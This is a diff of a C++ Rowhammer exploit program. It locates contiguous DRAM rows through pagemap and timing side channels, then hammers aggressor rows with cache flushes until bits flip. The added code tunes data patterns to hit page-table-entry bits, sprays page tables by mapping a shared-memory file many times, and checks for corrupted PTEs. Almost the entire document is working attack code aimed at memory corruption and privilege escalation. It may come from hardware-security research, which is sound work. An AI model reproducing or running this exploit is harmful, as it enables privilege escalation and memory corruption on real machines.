@@ -1,60 +1,17 @@
-#include <iostream>
 #include <sys/mman.h>
-#include <assert.h>
 #include <unistd.h>
 #include <sys/types.h>
-#include <fcntl.h>
 #include <string>
 #include <fstream>
-#include <vector>
 #include <cstring>
 #include <cstdlib>
 #include <chrono>
 
 #include "asm.h"
+#include "utils.h"
 #include "DRAMAddr.h"
 
 int buddies_past = 0;
-
-int gt(const void * a, const void * b) {
-   return ( *(int*)a - *(int*)b );
-}
-
-uint64_t median(uint64_t* vals, size_t size) {
-	qsort(vals, size, sizeof(uint64_t), gt);
-	return ((size%2)==0) ? vals[size/2] : (vals[(size_t)size/2]+vals[((size_t)size/2+1)])/2;
-}
-
-size_t get_pfn(size_t entry) {
-    return ((entry) & 0x7fffffffffffff);
-}
-
-size_t get_phys_addr2(uint64_t v_addr, int pmap_fd)
-{
-	uint64_t entry;
-	uint64_t offset = (v_addr / 4096) * sizeof(entry);
-	uint64_t pfn;
-	bool to_open = false;
-
-	if (pmap_fd == -1) {
-		pmap_fd = open("/proc/self/pagemap", O_RDONLY);
-		assert(pmap_fd >= 0);
-		to_open = true;
-	}
-	// int rd = fread(&entry, sizeof(entry), 1 ,fp);
-	int bytes_read = pread(pmap_fd, &entry, sizeof(entry), offset);
-
-	assert(bytes_read == 8);
-	assert(entry & (1ULL << 63));
-
-	if (to_open) {
-		close(pmap_fd);
-	}
-
-	pfn = get_pfn(entry);
-	assert(pfn != 0);
-	return (pfn << 12) | (v_addr & 4095);
-}
 
 int read_buddyinfo(){
 	int flag = 0;
@@ -85,7 +42,7 @@ int read_buddyinfo(){
 void hammer_sync(std::vector<volatile char *> &aggressors, int acts,
                                       volatile char *d1, volatile char *d2) {
   size_t ref_rounds = 0;
-  ref_rounds = std::max(1UL, acts/aggressors.size());
+  ref_rounds = std::max(1UL, acts/(aggressors.size()-2));
   size_t agg_rounds = ref_rounds;
   size_t before, after;
   size_t rounds = 0;
@@ -121,27 +78,26 @@ void hammer_sync(std::vector<volatile char *> &aggressors, int acts,
   // for (size_t i = 0; i < rounds; i++) {
 	while(n < 12800000){
     for (size_t j = 0; j < agg_rounds; j++) {
-      for (size_t k = 2; k < aggressors.size(); k++) {
+      // for (size_t k = 2; k < aggressors.size(); k++) { // S17
+			for (size_t k = 0; k < aggressors.size() - 2; k++) { // H19
         clflush(aggressors[k]);
       }
-      for (size_t k = 2; k < aggressors.size(); k++) {
+      // for (size_t k = 2; k < aggressors.size(); k++) { // S17
+			for (size_t k = 0; k < aggressors.size() - 2; k++) { // H19
         (void)(*aggressors[k]);
       }
-
       mfence();
     }
   
     // after HAMMER_ROUNDS/ref_rounds times hammering, check for next ACTIVATE
     while (true) {
 			n++;
-      mfence();
-      lfence();
       before = rdtscp();
       lfence();
+			(void)*d1;
       clflush(d1);
-      (void)*d1;
-      clflush(d2);
-      (void)*d2;
+			(void)*d2;
+			clflush(d2);
       after = rdtscp();
       lfence();
       // stop if an ACTIVATE was issued
@@ -267,7 +223,7 @@ size_t contiguous_memory(std::vector<volatile char *> &aggressors,
 	
 	int increment = 0x8000;
 
-	for(size_t tmp = (size_t)aggressors[1] + 0x10000; tmp < (size_t)mapped_target1 + alloc_size - increment; tmp += increment){
+	for(size_t tmp = (size_t)aggressors[1] + 0x18000; tmp < (size_t)mapped_target1 + alloc_size - increment; tmp += increment){
 		uint64_t* time_vals = (uint64_t*) calloc(rounds, sizeof(uint64_t));
 		for(int i = 0; i < rounds; i++){
 			clflush(aggressors[0]);
@@ -283,7 +239,7 @@ size_t contiguous_memory(std::vector<volatile char *> &aggressors,
 		// fprintf(stderr, "mdn: %ld\n", mdn);
 		if((mdn > THRESH) && (stop < num_rows)) {
 			aggressors.push_back((volatile char *)((int *)tmp)); 
-			tmp += 0x20000;
+			// tmp += 0x20000;
 			stop++;
 		}
 		// fprintf(stderr, "base: (0x%lx, 0x%lx), next: (0x%lx, 0x%lx), latency: %ld\n", (size_t)aggressors[0], get_phys_addr2((size_t)aggressors[0], pmap_fd), 
@@ -299,7 +255,7 @@ size_t contiguous_memory(std::vector<volatile char *> &aggressors,
 }
 
 void find_dummies(std::vector<volatile char *> &aggressors, 
-																					int alloc_size, std::vector<size_t> &addresses, 
+																					int alloc_size, size_t address, 
 																					int num_rows){
 
 	int pmap_fd = open("/proc/self/pagemap", O_RDONLY);
@@ -320,31 +276,29 @@ void find_dummies(std::vector<volatile char *> &aggressors,
 	int rounds = 100;
 	int stop = 0;
 
-	for(auto address : addresses){
-		for(size_t tmp = address; tmp < address + alloc_size - increment; tmp += increment){
-			uint64_t* time_vals = (uint64_t*) calloc(rounds, sizeof(uint64_t));
-			for(int i = 0; i < rounds; i++){
-				clflush((volatile void*)base_addr);
-				clflush((volatile void*)((int *)tmp));
-				mfence();
-				before = rdtscp();
-				lfence();
-				check1 = *((int *)((size_t)base_addr));
-				check2 = *((int *)(tmp));
-				time_vals[i] = rdtscp() - before; 
-			}
-			uint64_t mdn = median(time_vals, rounds);
-			// fprintf(stderr, "mdn: %ld\n", mdn);
-			if(aggressors.size() >= num_rows) return; 
-			else if((mdn > THRESH) && (stop < num_rows)) {
-				aggressors.push_back((volatile char *)((int *)tmp)); 
-				tmp += 0x20000;
-				stop++;
-			}
-			// fprintf(stderr, "base: (%p, 0x%lx), next: (0x%lx, 0x%lx), latency: %ld\n", base_addr, get_phys_addr2((size_t)base_addr, pmap_fd), 
-			// 																																							(int *)tmp, get_phys_addr2((size_t)(int *)tmp, pmap_fd), mdn);
-			free(time_vals);
+	for(size_t tmp = address; tmp < address + alloc_size - increment; tmp += increment){
+		uint64_t* time_vals = (uint64_t*) calloc(rounds, sizeof(uint64_t));
+		for(int i = 0; i < rounds; i++){
+			clflush((volatile void*)base_addr);
+			clflush((volatile void*)((int *)tmp));
+			mfence();
+			before = rdtscp();
+			lfence();
+			check1 = *((int *)((size_t)base_addr));
+			check2 = *((int *)(tmp));
+			time_vals[i] = rdtscp() - before; 
 		}
+		uint64_t mdn = median(time_vals, rounds);
+		// fprintf(stderr, "mdn: %ld\n", mdn);
+		if(aggressors.size() >= num_rows) return; 
+		else if((mdn > THRESH) && (stop < num_rows)) {
+			aggressors.push_back((volatile char *)((int *)tmp)); 
+			tmp += 0x20000;
+			stop++;
+		}
+		// fprintf(stderr, "base: (%p, 0x%lx), next: (0x%lx, 0x%lx), latency: %ld\n", base_addr, get_phys_addr2((size_t)base_addr, pmap_fd), 
+		// 																																							(int *)tmp, get_phys_addr2((size_t)(int *)tmp, pmap_fd), mdn);
+		free(time_vals);
 	}
 }
 
@@ -361,23 +315,22 @@ int main(int argc, char** argv){
 	std::vector<volatile char *> aggressors;
 	size_t num_rows = stoi(std::string(argv[1]));
 	int allocate_size = (1<<21);
-	size_t cont_start_addr;
 
 	auto start = std::chrono::high_resolution_clock::now();
-	cont_start_addr = contiguous_memory(aggressors, allocate_size, num_rows);
+	size_t cont_start_addr = contiguous_memory(aggressors, allocate_size, num_rows);
+	// fprintf(stderr, "addr: 0x%lx\n", cont_start_addr);
 
-	////////////////////////////////////////////////////////////////////
-	///////////////////   Prepare victim addresses   ///////////////////
-	////////////////////////////////////////////////////////////////////
 	std::vector<size_t> victim_addresses;
 
+	int index = 0;
 	while(aggressors.size() < num_rows){
 		auto mapped_target1 = mmap(NULL, allocate_size, PROT_READ | PROT_WRITE,
 			MAP_SHARED | MAP_POPULATE | MAP_ANONYMOUS, 0, 0);
 			
 		victim_addresses.push_back((size_t)mapped_target1);
 
-		find_dummies(aggressors, allocate_size, victim_addresses, num_rows);
+		find_dummies(aggressors, allocate_size, victim_addresses[index], num_rows);
+		index++;
 	}
 	
 	auto finish = std::chrono::high_resolution_clock::now();
@@ -387,90 +340,215 @@ int main(int argc, char** argv){
 	if((aggr2.bank != aggr1.bank) || (aggr2.row - aggr1.row != 2)) {
 		return 0;
 	}
+
 	std::cout << "contiguous memory: " << std::chrono::duration_cast<std::chrono::nanoseconds>(finish-start).count() << std::endl;
 	fprintf(stderr, "allocate %ldMB chunks for dummy rows\n", victim_addresses.size()*2);
 	for(size_t i = 0; i < aggressors.size(); i++){
 		DRAMAddr aggr((char*)((size_t)aggressors[i]));
 		fprintf(stderr, "Find! aggr: (0x%lx, 0x%lx), row: %ld, bank: %ld\n", (size_t)aggressors[i], get_phys_addr2((size_t)aggressors[i], pmap_fd), aggr.row, aggr.bank);
 	}
+
 	//////////////////////////////////////////////////////////////
 	///////////////////   Write data pattern   ///////////////////
 	//////////////////////////////////////////////////////////////
+	fprintf(stderr, "write victim and aggressor data pattern start\n");
 
 	for(size_t i = 0; i < allocate_size; i += 4096){
 		for(size_t j = 0; j < 4096; j+=sizeof(int)){
-			*((int *)(cont_start_addr+i+j)) = 0xffff0000;
-			// clflush((volatile char *)(int *)((size_t)aggressors[0]+i+j));
+			if(j % 2 == 0) *((int *)(cont_start_addr+i+j)) = 0x80000007;
+			else *((int *)(cont_start_addr+i+j)) = 0xfffff027;
+			clflush((volatile char *)(int *)(cont_start_addr+i+j));
 		}
 	}
-
-	fprintf(stderr, "write aggressor data pattern start\n");
 
 	for(size_t i = 0; i < aggressors.size(); i++){
 		for(size_t j = 0; j < 0x8000; j += sizeof(int)){
 			if((size_t)aggressors[i]+j > cont_start_addr + allocate_size) break;
-			*((int *)((size_t)aggressors[i]+j)) = 0x0000ffff;
+			if(j % 2 == 0) *((int *)((size_t)aggressors[i]+j)) = 0x80000000;
+			else *((int *)((size_t)aggressors[i]+j)) = 0x00000027;
+			clflush((volatile char *)(int *)((size_t)aggressors[i]+j));
 		}
 	}
 
 	fprintf(stderr, "finish\n");
 
-	void *written_data_raw = malloc(4096);
-	// void *written_data_raw_inv = malloc(4096);
-	int *written_data = (int*)written_data_raw;
-	// int *written_data_inv = (int*)written_data_raw_inv;
+	/////////////////////////////////////////////////////
+	//////////////   Prepare for compare   //////////////
+	/////////////////////////////////////////////////////
+	void *written_data_raw1 = malloc(4096);
+	int *written_data1 = (int*)written_data_raw1;
 	for (size_t j = 0; j < (unsigned long) 4096/sizeof(int); ++j)
-  	written_data[j] = 0xffff0000;
-	// for (size_t j = 0; j < (unsigned long) 4096/sizeof(int); ++j)
-  // 	written_data_inv[j] = 0xcccccccc;
+		written_data1[j] = 0x80000007;
 
-	/////////////////////////////////////////////////////
-	///////////////////   Hammering   ///////////////////
-	/////////////////////////////////////////////////////
-	fprintf(stderr, "Attack start\n");
-	start = std::chrono::high_resolution_clock::now();
-	hammer_sync(aggressors, 56, aggressors[0], aggressors[1]);
-	finish = std::chrono::high_resolution_clock::now();
-	fprintf(stderr, "Attack finish\n");
+	void *written_data_raw2 = malloc(4096);
+	int *written_data2 = (int*)written_data_raw2;
+	for (size_t j = 0; j < (unsigned long) 4096/sizeof(int); ++j)
+		written_data2[j] = 0xfffff027;
+	
+	int retry = 0;
+	int k = 0;
+	std::vector<size_t> bitflips;
 
-	std::cout << "attack time: " << std::chrono::duration_cast<std::chrono::nanoseconds>(finish-start).count() << std::endl;
+	do{
+		k++;
+		retry = 0;
 
-	/////////////////////////////////////////////////////////
-	///////////////////   Find bitflips   ///////////////////
-	/////////////////////////////////////////////////////////
-	fprintf(stderr, "Compare start\n");
-	start = std::chrono::high_resolution_clock::now();
-	int pass = 0;
-	for(size_t i = cont_start_addr; i < cont_start_addr + allocate_size; i += sizeof(int)){//4096){
-		// if(memcmp((void*)((size_t)aggressors[0]+i), (void*)written_data, 4096) == 1) fprintf(stderr, "Here\n");
-		if(*((int *)(i)) == 0xffff0000) continue;
-		for(int k = 0; k < aggressors.size(); k++){
-			if((i >= (size_t)aggressors[k]) && (i <= ((size_t)aggressors[k] + 0x8000))){
-				pass = 1;
-				break;
-			} 
+		/////////////////////////////////////////////////////
+		///////////   Write data pattern again   ////////////
+		/////////////////////////////////////////////////////
+		for(size_t i = 0; i < allocate_size; i += 4096){
+			for(size_t j = 0; j < 4096; j+=sizeof(int)){
+				if(j % 2 == 0) *((int *)(cont_start_addr+i+j)) = 0x80000007;
+				else *((int *)(cont_start_addr+i+j)) = 0xfffff027;
+				clflush((volatile char *)(int *)(cont_start_addr+i+j));
+			}
 		}
-		if(pass == 1){
-			pass = 0;
-			continue;
+
+		for(size_t i = 0; i < aggressors.size(); i++){
+			for(size_t j = 0; j < 0x8000; j += sizeof(int)){
+				if((size_t)aggressors[i]+j > cont_start_addr + allocate_size) break;
+				if(j % 2 == 0) *((int *)((size_t)aggressors[i]+j)) = 0x80000000;
+				else *((int *)((size_t)aggressors[i]+j)) = 0x00000027;
+				clflush((volatile char *)(int *)((size_t)aggressors[i]+j));
+			}
 		}
-		int expected_rand_value = written_data[(i % 4096) / sizeof(int)];
-		for (size_t c = 0; c < sizeof(int); c++) {
-			volatile char *flipped_address = (volatile char *)(i + c);
-			if (*flipped_address != ((char *) &expected_rand_value)[c]) {
-				const auto flipped_addr_value = *(unsigned char *) flipped_address;
-				const auto expected_value = ((unsigned char *) &expected_rand_value)[c];
-				fprintf(stderr, "Flip at %p from %x to %x\n", flipped_address, expected_value, flipped_addr_value);
+
+		/////////////////////////////////////////////////////
+		///////////////////   Hammering   ///////////////////
+		/////////////////////////////////////////////////////
+		fprintf(stderr, "Attack start\n");
+		start = std::chrono::high_resolution_clock::now();
+
+		// hammer_sync(aggressors, 56, aggressors[0], aggressors[1]); // S17
+		hammer_sync(aggressors, 36, aggressors[aggressors.size()-2], aggressors[aggressors.size()-1]); // H19
+		
+		finish = std::chrono::high_resolution_clock::now();
+		fprintf(stderr, "Attack finish\n");
+
+		std::cout << "attack time: " << std::chrono::duration_cast<std::chrono::nanoseconds>(finish-start).count() << std::endl;
+
+		/////////////////////////////////////////////////////////
+		///////////////////   Find bitflips   ///////////////////
+		/////////////////////////////////////////////////////////
+		int pass = 0;
+
+		fprintf(stderr, "Compare start\n");
+		start = std::chrono::high_resolution_clock::now();
+		
+		for(size_t i = cont_start_addr; i < cont_start_addr + allocate_size; i += sizeof(int)){
+			if(*((int *)(i)) == 0x80000007 || *((int *)(i)) == 0xfffff027) continue;
+			for(int k = 0; k < aggressors.size(); k++){
+				if((i >= (size_t)aggressors[k]) && (i <= ((size_t)aggressors[k] + 0x8000))){
+					if(*((int *)(i)) == 0x80000000 || *((int *)(i)) == 0x00000027){
+						pass = 1;
+						break;
+					}
+					break;
+				} 
+			}
+
+			if(pass == 1){
+				pass = 0;
+				continue;
+			}
+			
+			int expected_rand_value;
+			if(i % 2 == 0) expected_rand_value = written_data1[(i % 4096) / sizeof(int)];
+			else expected_rand_value = written_data2[(i % 4096) / sizeof(int)];
+			fprintf(stderr, "Flipped data from 0x%x to 0x%x\n", expected_rand_value, *((int *)(i)));
+			for (size_t c = 0; c < sizeof(int); c++) {
+				volatile char *flipped_address = (volatile char *)(i + c);
+				if (*flipped_address != ((char *) &expected_rand_value)[c]) {
+
+					if((i % 2 == 0 && c == 0) || (i % 2 == 1 && c > 1)) {
+						retry = 1;
+						bitflips.push_back((size_t)flipped_address);
+					}
+
+					const auto flipped_addr_value = *(unsigned char *) flipped_address;
+					const auto expected_value = ((unsigned char *) &expected_rand_value)[c];
+					// *(unsigned char *) flipped_address = ((unsigned char *) &expected_rand_value)[c]; // restore value
+					fprintf(stderr, "Flip at %p, %ldth bit, from 0x%x to 0x%x\n", flipped_address, c, expected_value, flipped_addr_value);
+				}
+			}
+			// clflush((volatile void *)i);
+		}
+		finish = std::chrono::high_resolution_clock::now();
+
+		std::cout << "compare time: " << std::chrono::duration_cast<std::chrono::nanoseconds>(finish-start).count() << std::endl;
+		fprintf(stderr, "Compare finish\n");
+	
+	} while(retry && k < 10);
+	
+	std::vector<size_t> flippable_addr;
+	int exist = find_flippable(bitflips, flippable_addr);
+
+	std::vector<size_t> file_mapped_addrs;
+
+	if(exist){
+		for(auto addr: flippable_addr){
+			fprintf(stderr, "Flippable page: 0x%lx\n", addr);
+			munmap((char*)(addr), 4096);
+		}
+
+		/////////////////////////////////////////////////////////
+		////////////////   Page table spraying   ////////////////
+		/////////////////////////////////////////////////////////
+		int fd;
+
+		if((fd = open("/dev/shm/feed", O_RDWR)) < 0){
+			perror("File Open Error");
+			exit(1);
+		}
+
+		// int num_pages = (1<<13) + (1<<12) + (1<<10) + (1<<9);
+		int num_pages = (1<<12) + (1<<11);
+		size_t alloc_size = (1<<30);
+
+		for(int i = 0; i < num_pages; i++){
+			auto mapped_target = mmap(NULL, alloc_size, PROT_READ | PROT_WRITE,
+				MAP_SHARED | MAP_POPULATE, fd, 0); // 2MB page table per mapping
+
+			if (mapped_target==MAP_FAILED) {
+				perror("mmap");
+				exit(EXIT_FAILURE);
+			}
+			file_mapped_addrs.push_back((size_t)mapped_target);
+		}
+
+		/////////////////////////////////////////////////////////////////
+		//////////////////////////   Attack   ///////////////////////////
+		/////////////////////////////////////////////////////////////////
+		fprintf(stderr, "Start flipping PTE\n");
+		// hammer_sync(aggressors, 56, aggressors[0], aggressors[1]); // S17
+		hammer_sync(aggressors, 36, aggressors[aggressors.size()-2], aggressors[aggressors.size()-1]); // H19
+
+		/////////////////////////////////////////////////////////////////
+		//////////////////   Verify PTE corruption   ////////////////////
+		/////////////////////////////////////////////////////////////////
+		fprintf(stderr, "Verify bitflips\n");
+		for(int i = 0; i < num_pages; i++){
+			for(size_t tmp = 0; tmp < 1024*1024*1024; tmp += 4096){
+				// if(tmp % 4096 == 0){
+				if(*((char *) (file_mapped_addrs[i] + tmp)) != '2'){
+					fprintf(stderr, "Pointing data: 0x%lx\n", *((size_t *) (file_mapped_addrs[i] + tmp)));
+					// *((size_t *) (addresses[i] + tmp)) = 0x80000000a6ed5037;
+					// for(int i = 0; i < num_pages; i++){
+					//   munmap((char*)addresses[i], alloc_size);
+					// }
+					// return;
+				}
 			}
 		}
 	}
-	finish = std::chrono::high_resolution_clock::now();
 
-	std::cout << "compare time: " << std::chrono::duration_cast<std::chrono::nanoseconds>(finish-start).count() << std::endl;
-	fprintf(stderr, "Compare finish\n");
 	/////////////////////////////////////////////////////////////////
 	///////////////////   Free allocated memory   ///////////////////
 	/////////////////////////////////////////////////////////////////
+	for(auto address: file_mapped_addrs){
+		munmap((char*)address, (1<<30));
+	}
+
 	for(auto address: victim_addresses){
 		munmap((char*)address, allocate_size);
 	}
